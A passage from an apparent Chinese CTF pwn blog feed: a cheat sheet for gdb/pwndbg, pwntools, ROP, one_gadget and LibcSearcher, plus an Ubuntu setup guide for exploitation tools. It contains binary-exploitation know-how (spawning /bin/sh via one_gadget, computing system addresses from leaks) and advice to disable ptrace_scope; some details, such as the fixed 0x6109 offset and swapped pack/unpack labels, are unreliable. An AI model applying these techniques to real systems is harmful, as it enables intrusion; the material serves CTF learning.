    <link href="https://ixout.github.io/posts/26682/"/>
    <id>https://ixout.github.io/posts/26682/</id>
    <published>2023-03-25T02:13:00.000Z</published>
    <updated>2023-04-05T08:59:47.827Z</updated>
    
    <content type="html"><![CDATA[<h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><h2 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h2><ul><li><p>[]表示直接输入</p></li><li><p>“”表示需由引号包裹</p></li><li>{}表示键盘操作</li></ul><h3 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h3><ul><li><p><code>help [指令]</code>查看个指令的用法</p></li><li><p><code>i</code>即info  查看信息</p><ul><li><code>i b</code>查看断点</li><li><code>i r</code>查看寄存器</li><li><code>i f</code>查看函数名</li></ul></li><li><code>show</code>与info类似,但更多是调试信息</li><li><code>stack [数]</code>查看栈</li><li><code>backtrace</code>查看栈的变化</li><li><code>vmmap</code>内存段基本信息</li></ul><h3 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h3><ul><li><p><code>start</code>开始或重新开始</p></li><li><p><code>s [数]</code>单步步入,数有填的话就是执行多少步,源码层面</p><ul><li><code>si [数]</code>同上,汇编层面</li></ul></li><li><code>n [数]</code>单步步过,数有填的话就是执行多少步,源码层面<ul><li><code>ni [数]</code>同上,汇编层面</li></ul></li><li><code>c</code>继续执行到断点，没断点就一直执行下去</li><li><code>&#123;ctrl+c&#125;</code>程序输入时强行中断</li><li><code>r</code>重新开始执行</li></ul><h3 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h3><ul><li><code>b *[地址]</code><ul><li><code>b *$ rebase([相对偏移])</code>开启pie时可用</li></ul></li><li><code>b [函数名]</code></li><li><code>b [数]</code>源码第几行断点</li><li><code>b +[数]</code>当前往下多少停住,同样可以有-</li><li><code>delete [数]</code>删除断点</li><li><code>disable [数]</code>禁用断点</li><li><code>enable [数]</code>启用断点</li><li><code>clear</code>清楚下面所有断点</li><li><code>watch [地址]</code>地址数据改变时停下</li><li><code>watch [变量]</code>/变量改变的时候会断</li><li><code>info watchpoints</code> 查看watch断点信息</li><li><code>catch syscall</code> syscall系统调用的时候断住</li><li><code>tcatch syscall</code> syscall系统调用的时候断住，只断一次</li><li><code>info break</code> catch的断点可以通过i b查看</li></ul><h3 id="查找数据"><a href="#查找数据" class="headerlink" title="查找数据"></a>查找数据</h3><ol><li><code>search [值(多是字面值,字符串之类)]</code></li><li><code>find &quot;字符串&quot;</code>    pwndbg独有</li></ol><h3 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h3><ul><li><p><code>x /[nuf]</code></p><ul><li><p>n代表几个单元</p></li><li><p>u代表每个单元几个字节(<strong>b—1</strong>|<strong>h—2</strong>|<strong>w—4</strong>|<strong>g—8</strong>)</p></li><li><p>f代表显示格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x 按十六进制格式显示变量。</span><br><span class="line">d 按十进制格式显示变量。</span><br><span class="line">u 按十六进制格式显示无符号整型。</span><br><span class="line">o 按八进制格式显示变量。</span><br><span class="line">t 按二进制格式显示变量。</span><br><span class="line">a 按十六进制格式显示变量。</span><br><span class="line">c 按字符格式显示变量。</span><br><span class="line">f 按浮点数格式显示变量。</span><br><span class="line">s 按字符串显示。</span><br><span class="line">b 按字符显示。</span><br><span class="line">i 显示汇编指令</span><br></pre></td></tr></table></figure></li></ul></li><li><p><code>p (&amp;)[符号]</code>打印符号的内容或查看符号的地址</p></li><li><p><code>telescope [内存|符号]</code>查看内容以更直观的方式</p></li></ul><h3 id="修改数据"><a href="#修改数据" class="headerlink" title="修改数据"></a>修改数据</h3><ul><li><code>set $[寄存器]=[值]</code> 把寄存器的值变为所更改的</li><li><code>set *([地址])=[值]</code> 地址的值更改，<strong>注意带星号</strong></li><li><code>set args &quot;a1&quot; &quot;a2&quot; &quot;a3&quot;</code> 给参数123赋值</li><li><code>set args &quot;python3 -c &#39;print &quot;1234\x7f\xde&quot;&#39;&quot;&#39;</code> 使用python给参数赋值不可见字符</li></ul><h3 id="堆-pwndbg-独有"><a href="#堆-pwndbg-独有" class="headerlink" title="堆(pwndbg)独有"></a>堆(pwndbg)独有</h3><ul><li><code>mp</code>查看mmap详细信息，包括临界信息等</li><li><p><code>top_chunk</code>显示topchunk信息</p></li><li><p><code>arena</code> 显示当前arena的详细信息</p><ul><li><code>arenas</code> 显示所有arena的基本信息</li><li><code>arenainfo</code> <strong>好看的显示</strong>所有arena的信息</li></ul></li><li><p><code>bins</code> </p><p>常用，查看所有种类的堆块的链表情况</p><ul><li><code>fastbins</code> 单独查看fastbins的链表情况</li><li><code>largebins</code> 同上，单独查看largebins的链表情况</li><li><code>smallbins</code> 同上，单独查看smallbins的链表情况</li><li><code>unsortedbin</code> 同上，单独查看unsortedbin链表情况</li><li><code>tcachebins</code> 同上，单独查看tcachebins的链表情况</li><li><code>tcache</code> 查看tcache详细信息</li></ul></li><li><p><code>heap</code> </p><p>数据结构的形式显示所有堆块，会显示一大堆</p><ul><li><code>heapbase</code> <strong>查看堆起始地址</strong></li><li><code>heapinfo</code>、<code>heapinfoall</code> 显示堆得信息，和bins的挺像的，<strong>没bins好用</strong></li><li><code>parseheap</code> 显示堆结构，<strong>很好用</strong></li></ul></li><li><p><code>tracemalloc</code> <strong>好用</strong>，会跟提示所有操作堆的地方</p></li><li><p><code>malloc_chunk [chunk符号或地址]</code>查看该chunk的信息</p></li><li><p><code>find_fake_fast [地址] [大小]</code> 查找一块可以在给定地址附近伪造fake_chunk的内存</p></li></ul><h3 id="其他-一些是pwndbg独有"><a href="#其他-一些是pwndbg独有" class="headerlink" title="其他(一些是pwndbg独有)"></a>其他(一些是pwndbg独有)</h3><ul><li><code>cyclic [数]</code> 生成用来溢出的字符<ul><li><code>cyclic -l [ 地址]</code>搭配使用</li></ul></li><li><code>$reabse</code> //<strong>开启PIE的情况的地址偏移</strong><ul><li><code>b *$reabse(0x123456)</code> 断住PIE状态下的二进制文件中0x123456的地方</li><li><code>codebase</code> 打印PIE偏移，<strong>与rebase不同，这是打印，rebase是使用</strong></li></ul></li><li><code>retaddr</code> 打印包含返回地址的栈地址</li><li><code>canary</code> 直接看canary的值</li><li><code>plt</code> 查看plt表</li><li><code>got</code> 查看got表</li><li><code>hexdump [地址] [数]</code> 像IDA那样显示数据，<strong>带字符串</strong></li></ul><h3 id="善用help-命令"><a href="#善用help-命令" class="headerlink" title="善用help [命令]"></a>善用help [命令]</h3><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><p>one_gadget是libc中存在的一些执行<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>的片段，当可以泄露libc地址，并且可以知道libc版本的时候，可以使用此方法来快速控制指令寄存器开启shell。</p><p>相比于<code>system(&quot;/bin/sh&quot;)</code>，这种方式更加方便，不用控制RDI、RSI、RDX等参数。运用于不利构造参数的情况。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget &lt;FILE|-b BuildID&gt; [options]</span><br></pre></td></tr></table></figure><ol><li>如果是使用_malloc_hook来调用one_gadget，那么需要配合realloc来构造所需参数，realloc在libc中的符号是__libc_realloc</li><li>如果是使用其他方式调用one_gadget，比如说修改GOT表，那么需要在栈上提前构造好参数，或者将rax寄存器清零</li><li>在泄露libc地址的时候，<strong>最好是泄露read函数的地址</strong>，因为<strong>read函数距离one_gadget的偏移是固定的</strong>，只需要将read函数真实地址<strong>减去0x6109</strong>，这么做的好处是不用知道libc的版本，</li></ol><h2 id="linux自带"><a href="#linux自带" class="headerlink" title="linux自带"></a>linux自带</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">readelf 读取基本信息</span><br><span class="line">file  读取基本信息</span><br><span class="line">strings 读取文件字符串</span><br><span class="line">ldd  查看文件使用的libc库和ld链接器</span><br></pre></td></tr></table></figure><h2 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h2><h2 id="glibc-all-one"><a href="#glibc-all-one" class="headerlink" title="glibc_all_one"></a>glibc_all_one</h2><h1 id="python包"><a href="#python包" class="headerlink" title="python包"></a>python包</h1><h2 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h2><h3 id="数据接收与发送"><a href="#数据接收与发送" class="headerlink" title="数据接收与发送"></a>数据接收与发送</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sh.recv(numb = 2048, timeout = dufault)  接受数据，numb指定接收的字节，timeout指定超时</span><br><span class="line">sh.recvline(keepends=True)  接受一行数据，keepends为是否保留行尾的\n</span><br><span class="line">sh.recvuntil(b&quot;Hello,World\n&quot;,drop=fasle)  接受数据直到设置的标志出现，drop表示是否接收标志，默认接收</span><br><span class="line">sh.recvall()  一直接收直到EOF</span><br><span class="line">sh.recvrepeat(timeout = default)  持续接受直到EOF或timeout</span><br><span class="line">sh.interactive()  直接进行交互，相当于回到shell的模式，在取得shell之后使用</span><br><span class="line">send(data) - 发送数据</span><br><span class="line">sendline(line) - 发送数据加一个换行</span><br><span class="line">u64()/u32()  打包</span><br><span class="line">p64()/p32()  解包</span><br></pre></td></tr></table></figure><p>补充一下与python字符串切片的联合使用</p><p>python字符串下标也是从0开始,str[a:b]是左取右不取,即如[1:5]表示第2个到第5个字符,负数表示倒数第几个,例如[-6:]表示从倒数第6个到结束,左边为空代表从头开始,右边为空代表到结束为止</p><p>以及<strong>左对齐ljust</strong>,<strong>右对齐rjust</strong></p><h3 id="针对elf的处理"><a href="#针对elf的处理" class="headerlink" title="针对elf的处理"></a>针对elf的处理</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">symbols[&#x27;a_function&#x27;] 找到 a_function 的地址</span><br><span class="line">##libc.symbols[&#x27;read&#x27;]</span><br><span class="line">got[&#x27;a_function&#x27;] 找到 a_function的 got</span><br><span class="line">##elf.got[&quot;read&quot;]</span><br><span class="line">plt[&#x27;a_function&#x27;] 找到 a_function 的 plt</span><br><span class="line">##elf.plt[&quot;read&quot;]</span><br><span class="line">next(e.search(&quot;some_characters&quot;)) 找到包含 some_characters（字符串，汇编代码或者某个数值）的地址</span><br><span class="line">##libc.next(e.search(&quot;/bin/sh&quot;))</span><br></pre></td></tr></table></figure><h3 id="context及log"><a href="#context及log" class="headerlink" title="context及log"></a>context及log</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = &#x27;DEBUG&#x27;</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)</span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br></pre></td></tr></table></figure><h3 id="与gdb联合"><a href="#与gdb联合" class="headerlink" title="与gdb联合"></a>与gdb联合</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach()</span><br><span class="line">Linux 系统有一个叫做trace_scope的设置，它可以阻止非子进程的进程被调试。Pwntools 对于它自己启动的任何进程都能解决这个问题，但是如果你必须在 Pwntools 之外启动一个进程，并试图通过 pid 附加到它（例如gdb.attach(1)），可能被阻止附加。</span><br><span class="line"></span><br><span class="line">可以通过禁用安全设置和重启机器来解决这个问题：</span><br><span class="line"></span><br><span class="line">sudo tee /etc/sysctl.d/10-ptrace.conf &lt;&lt;EOF</span><br><span class="line">kernel.yama.ptrace_scope = 0</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><h3 id="ROP链"><a href="#ROP链" class="headerlink" title="ROP链"></a>ROP链</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rop=ROP(&#x27;&#x27;)  创建一个rop对象</span><br><span class="line">rop.raw()   填充padding</span><br><span class="line">rop.call(&#x27;函数&#x27;,[arg1,arg2,arg3])  调用函数</span><br><span class="line">#对一些常见函数也可以直接</span><br><span class="line">#rop.read(arg1,arg2,arg3)</span><br><span class="line">#rop.write(arg1,arg2,arg3)</span><br><span class="line">rop.unresolve(&#x27;&#x27;) 返回符号的地址</span><br><span class="line">rop.chain()  返回完整的rop链</span><br><span class="line">rop.migrate(base_stage) 将程序流程转移到 base_stage（地址）,栈迁移?</span><br><span class="line">rop.dump() 直观地展示当前的 rop 链</span><br></pre></td></tr></table></figure><h3 id="pwntools附带的一些功能"><a href="#pwntools附带的一些功能" class="headerlink" title="pwntools附带的一些功能"></a>pwntools附带的一些功能</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">checksec 检查保护</span><br><span class="line">ROPgadget  gadget查找</span><br></pre></td></tr></table></figure><h2 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(&quot;函数名&quot;,函数真实地址)</span><br><span class="line"></span><br><span class="line">libcbase = 函数真实地址 – obj.dump(&quot;函数名&quot;)</span><br><span class="line">system_addr = libcbase + obj.dump(&quot;system&quot;)            #system 偏移</span><br><span class="line">bin_sh_addr = libcbase + obj.dump(&quot;str_bin_sh&quot;)         #/bin/sh 偏移</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">工欲善其事必先利其器</summary>
    
    
    
    <category term="杂烩" scheme="https://ixout.github.io/categories/%E6%9D%82%E7%83%A9/"/>
    
    
    <category term="基础" scheme="https://ixout.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
    <category term="工具使用" scheme="https://ixout.github.io/tags/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    
  </entry>
  
  <entry>
    <title>pwn环境准备</title>
    <link href="https://ixout.github.io/posts/6947/"/>
    <id>https://ixout.github.io/posts/6947/</id>
    <published>2023-03-22T02:29:06.000Z</published>
    <updated>2023-03-22T15:20:25.524Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>原本用的虚拟机不知道怎么抽风了，弄了半天没弄好😣，干脆一不做二不休删了重新安装(已经不知道第多少次了),顺便记录下环境搭建过程.因为用惯了ubuntu20所以这次的版本是20.04.04。</p><p><strong>心态爆炸</strong>，重装完后发现之前的问题还是存在，于是我怀疑是题目的问题，去google搜题的wp，结果告诉我就是题目有问题，🤡🤡鬼知道为什么连续做到的两题都是题目本身有问题(后面又试了下本地文件是可以的，但我直接远程调试）。</p><p><strong>也就是说我把自己用的好好的没有任何问题的虚拟机删了，然后花了四五个小时去重新装一个。。。。。</strong></p><p><strong>到底还是太急躁了，没有多试几道题就认定是虚拟机的问题，这次就当是吃了个大亏，以后遇到类似情况，还是要冷静，多取证再行动。</strong></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="设置超级用户"><a href="#设置超级用户" class="headerlink" title="设置超级用户"></a>设置超级用户</h2><p><code>sudo passwd root</code></p><h2 id="先换个源"><a href="#先换个源" class="headerlink" title="先换个源"></a>先换个源</h2><p>备份一下旧的</p><p><code>sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak</code></p><p>编辑</p><p><code>sudo gedit /etc/apt/sources.list</code></p><p>我选择阿里的源,感觉还过得去</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 阿里云镜像源</span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>这里又踩了个大坑</p><p>得先用<code>lsb_release -c</code>看看自己的ubuntu是哪个版本</p><p>我的是focal之前却用的bionic的源</p><p>就出现了装什么都出错的冥场面</p><h2 id="pip换源"><a href="#pip换源" class="headerlink" title="pip换源"></a>pip换源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ~/.pip/</span><br><span class="line">vim ~/.pip/pip.conf</span><br></pre></td></tr></table></figure><p>内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">trusted-host = pypi.tuna.tsinghua.edu.cn</span><br></pre></td></tr></table></figure><h2 id="安装vim"><a href="#安装vim" class="headerlink" title="安装vim"></a>安装vim</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install vim</span><br></pre></td></tr></table></figure><h2 id="安装gcc"><a href="#安装gcc" class="headerlink" title="安装gcc"></a>安装gcc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc</span><br><span class="line">gcc --version  </span><br></pre></td></tr></table></figure><h2 id="配置32位环境"><a href="#配置32位环境" class="headerlink" title="配置32位环境"></a>配置32位环境</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg --add-architecture i386</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt install build-essential</span><br><span class="line">sudo apt install gcc-multilib</span><br></pre></td></tr></table></figure><h2 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure><h2 id="安装pwntools"><a href="#安装pwntools" class="headerlink" title="安装pwntools"></a>安装pwntools</h2><p>两种方法</p><p>第一种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">sudo python3 -m pip install --upgrade pip</span><br><span class="line">sudo python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure><p>第二种</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Gallopsled/pwntools</span><br><span class="line">cd pwntools</span><br><span class="line">sudo python setup.py install #这一步最好挂魔法</span><br></pre></td></tr></table></figure><h2 id="安装capstone"><a href="#安装capstone" class="headerlink" title="安装capstone"></a>安装capstone</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/aquynh/capstone</span><br><span class="line">cd capstone</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><h2 id="pwndbg与pwngdb"><a href="#pwndbg与pwngdb" class="headerlink" title="pwndbg与pwngdb"></a>pwndbg与pwngdb</h2><p>pwngdb</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~/</span><br><span class="line">git clone https://github.com/scwuaptx/Pwngdb.git </span><br><span class="line">cp ~/Pwngdb/.gdbinit ~/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">功能</span><br><span class="line">libc : Print the base address of libc</span><br><span class="line">ld : Print the base address of ld</span><br><span class="line">codebase : Print the base of code segment</span><br><span class="line">heap : Print the base of heap</span><br><span class="line">got : Print the Global Offset Table infomation</span><br><span class="line">dyn : Print the Dynamic section infomation</span><br><span class="line">findcall : Find some function call</span><br><span class="line">bcall : Set the breakpoint at some function call</span><br><span class="line">tls : Print the thread local storage address</span><br><span class="line">at : Attach by process name</span><br><span class="line">findsyscall : Find the syscall</span><br><span class="line">fmtarg : Calculate the index of format string</span><br><span class="line">You need to stop on printf which has vulnerability.</span><br><span class="line">force : Calculate the nb in the house of force.</span><br><span class="line">heapinfo : Print some infomation of heap</span><br><span class="line">heapinfo (Address of arena)</span><br><span class="line">default is the arena of current thread</span><br><span class="line">If tcache is enable, it would show infomation of tcache entry</span><br><span class="line">heapinfoall : Print some infomation of heap (all threads)</span><br><span class="line">arenainfo : Print some infomation of all arena</span><br><span class="line">chunkinfo: Print the infomation of chunk</span><br><span class="line">chunkinfo (Address of victim)</span><br><span class="line">chunkptr : Print the infomation of chunk</span><br><span class="line">chunkptr (Address of user ptr)</span><br><span class="line">mergeinfo : Print the infomation of merge</span><br><span class="line">mergeinfo (Address of victim)</span><br><span class="line">printfastbin : Print some infomation of fastbin</span><br><span class="line">tracemalloc on : Trace the malloc and free and detect some error .</span><br><span class="line">You need to run the process first than tracemalloc on, it will record all of the malloc and free.</span><br><span class="line">You can set the DEBUG in pwngdb.py , than it will print all of the malloc and free infomation such as the screeshot.</span><br><span class="line">parseheap : Parse heap layout</span><br><span class="line">magic : Print useful variable and function in glibc</span><br><span class="line">fp : show FILE structure</span><br><span class="line">fp (Address of FILE)</span><br><span class="line">fpchain: show linked list of FILE</span><br><span class="line">orange : Test house of orange condition in the _IO_flush_lockp</span><br><span class="line">orange (Address of FILE)</span><br><span class="line">glibc version &lt;= 2.23</span><br></pre></td></tr></table></figure><p>pwndbg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">./setup.sh#建议挂魔法</span><br></pre></td></tr></table></figure><p>联合使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gedit ~/.gdbinit</span><br><span class="line">注释掉第一行 然后在第二行写入</span><br><span class="line">source ~/pwndbg/gdbinit.py</span><br></pre></td></tr></table></figure><h2 id="安装seccomp-tools"><a href="#安装seccomp-tools" class="headerlink" title="安装seccomp-tools"></a>安装seccomp-tools</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc ruby-dev</span><br><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure><h2 id="安装one-gadget"><a href="#安装one-gadget" class="headerlink" title="安装one_gadget"></a>安装one_gadget</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><h2 id="安装LibcSearcher"><a href="#安装LibcSearcher" class="headerlink" title="安装LibcSearcher"></a>安装LibcSearcher</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install LibcSearcher</span><br><span class="line">sudo pip3 install -U LibcSearcher</span><br></pre></td></tr></table></figure><h2 id="安装main-arena-offset"><a href="#安装main-arena-offset" class="headerlink" title="安装main_arena_offset"></a>安装main_arena_offset</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/dev2ero/py_main_arena_offset.git</span><br><span class="line">cd py_main_arena_offset</span><br><span class="line">sudo python3 setup.py develop</span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pymao import *</span><br><span class="line"></span><br><span class="line">libc = &quot;./libc.so.6&quot;</span><br><span class="line">main_arena_offset = gmao( libc )</span><br><span class="line">print(hex(main_arena_offset))</span><br></pre></td></tr></table></figure><h2 id="安装本地调试不同版本的libc环境"><a href="#安装本地调试不同版本的libc环境" class="headerlink" title="安装本地调试不同版本的libc环境"></a>安装本地调试不同版本的libc环境</h2><p><strong>glibc-all-in-one</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line">cd glibc-all-in-one</span><br><span class="line">python3 update_list</span><br><span class="line">cat list</span><br><span class="line"> ./download [libc-version]</span><br></pre></td></tr></table></figure><p><strong>patchelf</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/NixOS/patchelf.git</span><br><span class="line">cd patchelf</span><br><span class="line">sudo apt-get install autoconf automake libtool</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">patchelf --replace-needed libc.so.6 [your-libc-path] [yourelf]</span><br><span class="line">patchelf --set-interpreter [libc-ld-path] [elf]</span><br><span class="line">cp -r ~/Desktop/glibc-all-in-one/libs/[libcfolderpath]/.debug/ ./debug</span><br><span class="line">gdb 